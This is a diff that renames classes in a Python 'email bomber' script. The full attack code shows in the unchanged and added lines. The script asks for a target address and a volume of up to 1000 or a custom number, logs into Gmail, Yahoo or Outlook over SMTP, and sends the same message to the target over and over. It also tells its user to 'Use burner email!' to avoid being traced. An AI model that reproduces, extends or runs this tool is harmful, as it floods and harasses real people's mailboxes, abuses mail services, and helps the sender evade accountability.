@@ -2,14 +2,14 @@ import smtplib
 import sys
 
 
-class bcolors:
+class Bcolors:
     GREEN = '\033[92m'
     YELLOW = '\033[93m'
     RED = '\033[91m'
 
 
 def banner():
-    print(bcolors.RED + '''                           
+    print(Bcolors.RED + '''                           
     
                                  _ ___                 _ _ 
                                 |  ___|               (_) |
@@ -44,20 +44,20 @@ def banner():
                                |###########################|             
                                 \#########################/              
                                  `.#####################,'               
-                                   `._###############_,'                 
-                                      `--..#####..--'                                      ,''.
+                                   `._###############_,'                                     
+                                      `--..#####..--'                                     ,,--.
 *_______________________________________________________________________________________,'(Bomb)
-                                                                                            `---' ''')
+                                                                                           `---' ''')
 
 
-class Email_Bomber:
+class EmailBomber:
     count = 0
 
     def __init__(self):
         try:
-            print(bcolors.RED + '\n+[+[+[+[+[+[ Initializing program ]+]+]+]+]+]+')
-            self.target = str(input(bcolors.GREEN + 'Enter target email: '))
-            self.mode = int(input(bcolors.GREEN + 'Enter Bomb mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom): '))
+            print(Bcolors.RED + '\n+[+[+[+[+[+[ Initializing program ]+]+]+]+]+]+')
+            self.target = str(input(Bcolors.GREEN + 'Enter target email: '))
+            self.mode = int(input(Bcolors.GREEN + 'Enter Bomb mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom): '))
 
             if int(self.mode) > int(4) or int(self.mode) < int(1):
                 print('ERROR: Invalid Option. Goodbye.')
@@ -68,7 +68,7 @@ class Email_Bomber:
 
     def bomb(self):
         try:
-            print(bcolors.RED + '\n+[+[+[+[+[+[ Setting up Bomb ]+]+]+]+]+]+')
+            print(Bcolors.RED + '\n+[+[+[+[+[+[ Setting up Bomb ]+]+]+]+]+]+')
             self.amount = None
 
             if self.mode == int(1):
@@ -81,22 +81,22 @@ class Email_Bomber:
                 self.amount = int(250)
 
             else:
-                self.amount = int(input(bcolors.GREEN + 'Choose CUSTOM amount <: '))
-            print(bcolors.RED + f'\n+[+[+[+[+[+[ Bomb mode selected: {self.mode} and {self.amount} emails ]+]+]+]+]+]+')
+                self.amount = int(input(Bcolors.GREEN + 'Choose CUSTOM amount <: '))
+            print(Bcolors.RED + f'\n+[+[+[+[+[+[ Bomb mode selected: {self.mode} and {self.amount} emails ]+]+]+]+]+]+')
 
         except Exception as e:
             print(f'ERROR: {e}')
 
     def email(self):
         try:
-            print(bcolors.RED + '\nTip: Use burner email!...   +[+[+[+[+[+[ Setup Email ]+]+]+]+]+]+ ')
-            self.server = str(input(bcolors.GREEN + 'Enter email / select options - 1: G-mail 2: Yahoo 3: Outlook: '))
+            print(Bcolors.RED + '\nTip: Use burner email!...   +[+[+[+[+[+[ Setup Email ]+]+]+]+]+]+ ')
+            self.server = str(input(Bcolors.GREEN + 'Enter email / select options - 1: G-mail 2: Yahoo 3: Outlook: '))
             pre_made = ['1', '2', '3']
             default_port = True
 
             if self.server not in pre_made:
                 default_port = False
-                self.port = int(input(bcolors.GREEN + 'Enter port number: '))
+                self.port = int(input(Bcolors.GREEN + 'Enter port number: '))
 
             if default_port:
                 self.port = int(587)
@@ -110,10 +110,10 @@ class Email_Bomber:
             elif self.server == '3':
                 self.server = 'smtp-mail.outlook.com'
 
-            self.fromAdder = str(input(bcolors.GREEN + 'Enter from address: '))
-            self.fromPwd = str(input(bcolors.GREEN + 'Enter from password: '))
-            self.subject = str(input(bcolors.GREEN + 'Enter subject: '))
-            self.message = str(input(bcolors.GREEN + 'Enter message: '))
+            self.fromAdder = str(input(Bcolors.GREEN + 'Enter from address: '))
+            self.fromPwd = str(input(Bcolors.GREEN + 'Enter from password: '))
+            self.subject = str(input(Bcolors.GREEN + 'Enter subject: '))
+            self.message = str(input(Bcolors.GREEN + 'Enter message: '))
 
             self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
             ''' % (self.fromAdder, self.target, self.subject, self.message)
@@ -131,13 +131,13 @@ class Email_Bomber:
         try:
             self.s.sendmail(self.fromAdder, self.target, self.msg)
             self.count += 1
-            print(bcolors.YELLOW + f'BOMB: {self.count}')
+            print(Bcolors.YELLOW + f'BOMB: {self.count}')
 
         except Exception as e:
             print(f'ERROR: {e}')
 
     def attack(self):
-        print(bcolors.RED + '\n+[+[+[+[+[+[ Attacking... ]+]+]+]+]+]+')
+        print(Bcolors.RED + '\n+[+[+[+[+[+[ Attacking... ]+]+]+]+]+]+')
 
         for email in range(self.amount + 1):
             self.send()
@@ -148,7 +148,7 @@ class Email_Bomber:
 
 if __name__ == '__main__':
     banner()
-    bomb = Email_Bomber()
+    bomb = EmailBomber()
     bomb.bomb()
     bomb.email()
     bomb.attack()
